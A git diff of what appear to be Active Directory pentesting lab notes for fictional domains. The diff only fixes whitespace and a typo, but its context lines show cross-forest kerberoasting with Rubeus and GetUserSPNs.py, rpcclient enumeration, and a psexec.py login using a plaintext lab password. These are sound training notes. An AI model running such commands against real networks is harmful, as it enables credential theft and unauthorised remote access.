@@ -269,8 +269,6 @@ Unknown 3:      0x1
 rpcclient $>
 ```
 
-  
-
 ## Query to enum information about password policy
 ```bash
 rpcclient $> getdompwinfo
@@ -1317,10 +1315,9 @@ Enumerating the founded Account
 Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
 ```
 
-Use Rubeus with the **/domain:** flagt to specify the target domain
+Use Rubeus with the **/domain:** flag to specify the target domain
 ```bash
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
-
 ```
 
 ## Foreign group membership
@@ -1336,8 +1333,6 @@ Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
 # Kerberoasting Attack Domain Trust Cross-Forest - Linux
 
 Enumerating Accounts for Associated **SPNs** Using **GetUserSPNs.py**
-
-
 
 ```bash
 GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student
@@ -1355,8 +1350,7 @@ Connect to the target domain using **psexec.py**
 psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
 ```
 
-
-# Hashcat  
+# Hashcat
 
 ### NTLMv2
 ```
